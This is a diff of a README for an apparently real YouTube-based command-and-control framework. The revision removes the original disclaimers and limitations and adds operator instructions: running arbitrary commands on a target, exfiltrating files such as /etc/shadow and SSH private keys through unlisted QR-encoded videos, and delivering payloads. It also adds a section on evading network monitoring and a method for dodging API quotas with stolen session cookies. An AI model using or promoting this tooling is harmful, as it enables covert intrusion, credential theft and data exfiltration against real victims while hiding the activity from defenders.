@@ -1,48 +1,178 @@
-# CTwobe - YouTube Covert Channel PoC
+# CTwobe - YouTube Covert Channel Framework
 
-CTwobe is a **Proof of Concept** demonstration of using YouTube as a covert communication channel. This project showcases how YouTube's platform could theoretically be leveraged for command and control operations through video descriptions, comments, and encoding data into video frames.
+CTwobe is a proof-of-concept command and control framework that leverages YouTube's infrastructure as a covert communication channel. This project demonstrates how legitimate social media APIs can be weaponized for data exfiltration, command execution, and binary payload delivery while evading traditional network monitoring.
 
-**IMPORTANT: This tool is for educational and research purposes only. It is not intended for actual use in any unauthorized activities.**
+## Overview
 
-## Concept Overview
+Modern security defenses focus on detecting malicious network traffic, blocking suspicious domains, and monitoring uncommon protocols. CTwobe bypasses these controls by tunneling all C2 communications through YouTube-a platform that's whitelisted in virtually every enterprise environment and generates enormous legitimate traffic volumes that provide natural cover.
 
-CTwobe demonstrates three main covert channel techniques:
+The framework implements three complementary covert channels:
 
-- Command and Control via Video Descriptions: Using YouTube video descriptions to transmit commands and receive results
-- Data Exfiltration via Comments: Posting command results as comments on videos
-- Binary Data Transfer via QR-Encoded Videos: Encoding files into QR code video frames and uploading as unlisted videos
+1. **Bidirectional C2 via Video Descriptions** - Command transmission and basic result exfiltration
+2. **Data Exfiltration via Comments** - High-volume output retrieval from target systems
+3. **Binary Transfer via QR-Encoded Video** - Payload delivery and large file exfiltration
 
-## Practical Limitations
+## Technical Implementation
 
-### YouTube API Quota Restrictions
+### Architecture
 
-This PoC is fundamentally impractical for real-world use due to severe YouTube API quota limitations:
+**Controller (CtwobeController.py)**
+- Interactive command-line interface for operator
+- Issues commands by updating YouTube video descriptions
+- Retrieves execution results from video comments
+- Manages OAuth authentication for controller's YouTube account
 
-- The YouTube API has strict daily quota limits (typically 10,000 units per day)
-- Each operation consumes quota units:
-    - Reading video information: ~1-3 units
-    - Updating descriptions: ~50 units
-    - Reading comments: ~1 unit per comment
-    - Posting comments: ~50 units
-    - Uploading videos: ~1600 units
+**Target Agent (CtwobeTarget.py)**
+- Polls designated video description every 60 seconds for new commands
+- Executes received commands and posts results as comments
+- Supports command execution, file upload, and payload download
+- Maintains persistence through credential caching
 
-A typical CTwobe operating session would exhaust daily quotas within minutes of active use, making it unsustainable for any practical application. (Although this can be bypassed using something like Selenium- however that is beyond the scope of this project)
+**QRizon Module (QRizon.py)**
+- Encodes arbitrary binary files into QR code video streams
+- Dual QR-per-frame design maximizes data density
+- Supports any file type: executables, scripts, documents, archives
 
-### Other Significant Limitations
+### Command Interface
 
-- **Authentication Requirements**: Requires OAuth credentials with extensive YouTube permissions
-- **Performance**: The QR code video encoding/decoding process is extremely inefficient for data transfer
-- **Account Risk**: Using this tool could result in YouTube account termination for Terms of Service violations
+The agent supports three command types:
 
-## Warning
+**`exec <command>`**
+```bash
+exec whoami
+exec cat /etc/passwd
+exec powershell -c Get-Process
+```
+Executes arbitrary shell commands on the target system and returns output via comments.
 
-This tool **should not be used** for:
+**`upload <filepath>`**
+```bash
+upload /etc/shadow
+upload sensitive_data.zip
+upload ~/.ssh/id_rsa
+```
+Encodes the specified file into a QR code video, uploads it as an unlisted YouTube video, and returns the video ID to the operator.
 
-- Actual penetration testing engagements
-- Any unauthorized system access
-- Malicious activities of any kind
-- Circumventing platform security controls
+**`download <video_id>`**
+```bash
+download dQw4w9WgXcQ
+```
+Downloads the specified YouTube video, decodes the QR frames back into the original file(s), enabling in-memory payload execution or tool delivery.
 
-## Legal Disclaimer
+## Operational Advantages
 
-Usage of CTwobe for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, national, and international laws. I assume no liability and are not responsible for any misuse or damage caused by this program.
+### Evasion of Network Monitoring
+
+Traditional network security controls fail to detect CTwobe because:
+
+**Encrypted Transport**: All communications use HTTPS to YouTube's legitimate infrastructure, making deep packet inspection ineffective.
+
+**Trusted Domain**: YouTube (googleapis.com, youtube.com) is whitelisted in virtually all environments and generates massive legitimate traffic that provides cover.
+
+**No Suspicious Indicators**: No connections to unknown domains, no uncommon ports, no unusual protocols-just normal HTTPS API calls.
+
+**Behavioral Blending**: YouTube API usage patterns blend into normal user activity (video uploads, comment posting, description updates).
+
+**No C2 Infrastructure**: No attacker-controlled servers to detect, block, or seize. The entire operation uses Google's infrastructure.
+
+## Possible Implementations for real-world engagements
+
+The API quota limitations can be trivially bypassed in real-world scenarios:
+
+**Playwright/Puppeteer Approach**:
+- Instead of YouTube Data API, control headless Chrome/Firefox
+- Use stolen session cookies or legitimate user credentials
+- Perform all actions through browser automation
+- Bypasses API quotas entirely-only limited by account standing
+- Even harder to detect as it generates identical traffic to legitimate browser usage
+
+**Implementation**: An attacker would modify the agent to:
+1. Extract victim's YouTube session cookies from browser
+2. Use Playwright to automate video access/uploads as the authenticated user
+3. Avoid API quotas while maintaining even better operational security
+4. Generate perfect behavioral mimicry of legitimate user actions
+
+## Usage
+
+### Prerequisites
+
+```bash
+pip install google-auth-oauthlib google-auth-httplib2 google-api-python-client
+pip install opencv-python qrcode pyzbar pillow yt-dlp numpy
+```
+
+### Setup
+
+1. **Create Google Cloud Project**:
+   - Enable YouTube Data API v3
+   - Create OAuth 2.0 credentials
+   - Download `client_secrets.json`
+
+2. **Configure Target Agent**:
+   - Edit `CtwobeTarget.py` line 198: Set `TARGET_VIDEO_ID` to your video ID
+   - Run agent: `python3 CtwobeTarget.py`
+   - Complete OAuth flow on first run (creates token_server.pickle)
+
+3. **Run Controller**:
+   - Run: `python3 CtwobeController.py`
+   - Enter the same target video ID
+   - Complete OAuth flow (creates token_client.pickle)
+
+### Operation
+
+**Send Command**:
+```
+Enter command: exec hostname
+Command sent successfully!
+```
+
+**Retrieve Results**:
+```
+Enter command: results
+=== COMMAND RESULTS ===
+victim-workstation
+=====================
+```
+
+**Exfiltrate File**:
+```
+Enter command: upload /etc/passwd
+[Agent uploads QR video, returns video ID in results]
+
+Enter command: results
+=== COMMAND RESULTS ===
+dQw4w9WgXcQ
+=====================
+```
+
+**Deliver Payload**:
+```
+# First encode your payload to video
+python3 QRizon.py encode -i payload.bin -o payload.mp4
+
+# Upload to YouTube manually or via YTUpload.py
+# Then send download command
+Enter command: download dQw4w9WgXcQ
+```
+
+## Limitations and Considerations
+
+- **Authentication Required**: Requires valid YouTube API credentials (or stolen cookies for browser automation variant)
+- **Polling Latency**: 60-second polling interval creates command execution delay
+- **Encoding Overhead**: QR video encoding is bandwidth-inefficient compared to raw transfer
+- **Operational Security**: Credential forensics and behavioral analytics provide detection opportunities
+- **Account Risk**: Violates YouTube Terms of Service; accounts may be suspended if detected
+
+These limitations are inherent to the covert channel approach and represent the trade-off between stealth and efficiency. For attackers with patience and proper operational security, these constraints are acceptable given the evasion benefits.
+
+## Research and Educational Value
+
+CTwobe demonstrates:
+- **Modern Covert Channels**: How legitimate APIs become attack infrastructure
+- **Defense Evasion**: Limitations of network-based security controls
+- **Detection Strategies**: Importance of endpoint visibility and behavioral analytics
+- **Cloud Security**: Risks of OAuth credential compromise and API abuse
+
+---
+
+*Developed for security research purposes. Usage without proper authorization is prohibited.*
